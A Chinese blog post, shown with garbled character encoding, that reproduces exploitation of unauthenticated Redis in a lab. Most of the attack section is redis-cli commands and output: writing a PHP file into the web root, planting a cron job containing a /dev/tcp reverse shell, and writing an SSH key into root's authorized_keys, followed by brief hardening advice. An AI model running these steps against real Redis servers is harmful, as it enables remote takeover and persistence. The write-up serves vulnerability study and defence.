---
layout: post
title: "Redisæœªæˆæƒè®¿é—®çš„å‘ç°å’Œåˆ©ç”¨"
date: 2021-12-04
author: 2hanx
toc: true
comments: true
categories: [æ¼æ´å¤ç°]
tags: [Redis]
---

### åº”ç”¨ä»‹ç»

Redis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSDè®¸å¯ï¼‰çš„ï¼Œå†…å­˜ä¸­çš„**æ•°æ®ç»“æ„å­˜å‚¨ç³»ç»Ÿ**ï¼Œå®ƒå¯ä»¥ç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä¸­é—´ä»¶ï¼Œå¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚

### æ¼æ´ä»‹ç»

Redis **å› é…ç½®ä¸å½“å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®**ï¼Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚å¦‚æœ Redis ä»¥ *root* èº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™ *root* è´¦æˆ·å†™å…¥SSH å…¬é’¥æ–‡ä»¶ï¼Œé€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨æƒé™è¢«è·å–å’Œæ•°æ®åˆ é™¤ã€æ³„éœ²æˆ–åŠ å¯†å‹’ç´¢äº‹ä»¶å‘ç”Ÿï¼Œä¸¥é‡å±å®³ä¸šåŠ¡æ­£å¸¸æœåŠ¡ã€‚

### æ¼æ´å±å®³

1. æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œ `flushall `æ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®
2. å¯é€šè¿‡ `eval` æ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å†™å…¥åé—¨åˆ°å¤‡ä»½æ–‡ä»¶é‡Œ
3. å¦‚æœ Redis æœåŠ¡å™¨ç”± *root* è´¦å·è¿è¡Œï¼Œåˆ™å¯ä»¥ç»™ *root* è´¦æˆ·å†™å…¥ ssh å…¬é’¥æ–‡ä»¶ï¼Œä»è€Œè¿œç¨‹ç™»å½•åˆ°æœåŠ¡å™¨

### ç¯å¢ƒæ­å»º

```shell
apt-get install redis-server
```

### æ¼æ´å¤ç°

Redis çš„é»˜è®¤å¼€æ”¾ç«¯å£æ˜¯ **6379**ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ `redis-cli` å·¥å…·è¿œç¨‹è¿æ¥ Redis æœåŠ¡å™¨ã€‚

```shell
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# redis-cli -h 192.168.174.141   
192.168.174.141:6379> help
redis-cli 6.0.16
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
192.168.174.141:6379> info
# Server
redis_version:4.0.14
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:3914f9509eb3b682
redis_mode:standalone
os:Linux 5.11.0-40-generic x86_64
......
192.168.174.141:6379> keys *
(empty array)
```

å½“è¾“å…¥ `keys *` å‘½ä»¤æŸ¥çœ‹æ•°æ®åº“å†…å®¹æ—¶æœªå‡ºç° *error*ï¼Œåˆ™è¡¨ç¤ºè¯¥æ•°æ®åº“æœªè®¾ç½®å¯†ç ï¼Œè€Œå¦‚æœéœ€è¦è®¤è¯çš„è¯ï¼Œåˆ™ä½¿â½¤å‘½ä»¤`auth "password"`ã€‚

#### æ¼æ´éªŒè¯

`nuclei.exe -u 192.168.174.141 -t .\exposed-redis.yaml`

#### æ”»å‡»åˆ©ç”¨

> å‰ææ¡ä»¶ï¼š
>
> 1. å¯æœªæˆæƒæˆ–å¼±å£ä»¤è¿æ¥ redis å¹¶æ‰§â¾redisæŒ‡ä»¤
> 2. å¼€å¯webæœåŠ¡å™¨ï¼Œå¹¶ä¸”çŸ¥é“è·¯å¾„ï¼Œæ­¤å¤–è¿˜éœ€è¦å…·æœ‰â½‚ä»¶ CURD æƒé™ï¼ˆæˆ‘ä»¬å¯ä»¥å°† `dir `è®¾ç½®ä¸ºâ¼€ä¸ªâ½¬å½• `a`ï¼Œâ½½`dbfilename`ä¸ºâ½‚ä»¶å`b`ï¼Œå†æ‰§â¾`save`æˆ– `bgsave`ï¼Œåˆ™æˆ‘ä»¬å°±å¯ä»¥å†™â¼Šâ¼€ä¸ªè·¯å¾„ä¸º`a/b`çš„ä»»æ„â½‚ä»¶ï¼‰

1. å†™webshell

   ```shell
   192.168.174.141:6379> config set dbfilename bd.php
   OK
   192.168.174.141:6379> set webshell "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
   OK
   192.168.174.141:6379> config set dir /var/www/html
   OK
   192.168.174.141:6379> save
   OK
   192.168.174.141:6379>
   ```

2. åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shell

   ```shell
   192.168.174.141:6379> set cron "\r\n\r\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.174.141/6677 0>&1\n\r\n\r"
   OK
   192.168.174.141:6379> get cron
   "\r\n\r\n*/1 * * * * /bin/bash -i >& /dev/tcp/192.168.174.141/6677 0>&1\n\r\n\r"
   192.168.174.141:6379> config set dir /var/spool/cron
   OK
   192.168.174.141:6379> config set dbfilename root
   OK
   192.168.174.141:6379> save
   OK
   192.168.174.141:6379>
   ```

3. å†™sshç§é’¥è¿œç¨‹ç™»å½•

   1. æœ¬åœ°ç”Ÿæˆsshå…¬ç§é’¥

      ```bash
      ssh-keygen -t rsa
      ```

   2. å°†ç”Ÿæˆçš„ *id_rsa* å¦å­˜ä¸º *redis.txt*

      ```shell
      (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > redis.txt
      ```

   3. å¯¼å…¥ redis

      ```shell
      cat ~/.ssh/redis.txt | redis-cli -h 192.168.174.141 -p 6379 -a 123456 -x set crack
      ```

      > æ­¤æ—¶ Redis æ•°æ®åº“ä¸­ `crack` é”®çš„å€¼å°±æ˜¯ç™»å½•ç§é’¥

   4. å°†ç§é’¥å†™å…¥åˆ° *root* è´¦å·ä¸‹

      ```shell
      192.168.174.141:6379> config set dir /home/root/.ssh
      OK
      192.168.174.141:6379> config set dbfilename authorized_keys
      OK
      192.168.174.141:6379> save
      OK
      ```

   5. è¿œç¨‹è¿æ¥

      ```shell
      ssh -i id_rsa root@192.168.174.141
      ```

### ä¿®å¤å»ºè®®

1. è®¾ç½® bind ip

   ä¿®æ”¹ `/etc/redis/redis.conf` é…ç½®æ–‡ä»¶ä¸­çš„ *bind* å€¼ã€‚

2. è®¾ç½®å¯†ç 

   ```shell
   192.168.174.141:6379> config set requirepass "yourpassword"
   ```

3. ä¿®æ”¹é»˜è®¤ç«¯å£

### æ€»ç»“

1. Redis å¸¸ç”¨å‘½ä»¤

   ```shell
   # æŸ¥çœ‹æ•°æ®åº“æ‰€æœ‰å†…å®¹
   keys *
   # æŸ¥çœ‹æŸä¸ªé”®çš„å€¼
   get mykey
   # æŸ¥çœ‹ä¿¡æ¯
   info
   # æŸ¥çœ‹é…ç½®æ–‡ä»¶
   config get *
   # æŸ¥çœ‹æ•°æ®åº“å¯†ç 
   config get requirepass
   # åˆ é™¤æ•°æ®åº“å¯†ç 
   config set requirepass ""
   # è®¾ç½®æ•°æ®åº“å¯†ç 
   config set requirepass "passwd"
   # éªŒè¯å¯†ç 
   auth "passwd"
   # é»˜è®¤é…ç½®æ–‡ä»¶åœ°å€
   /etc/redis/redis.conf
   ```

   
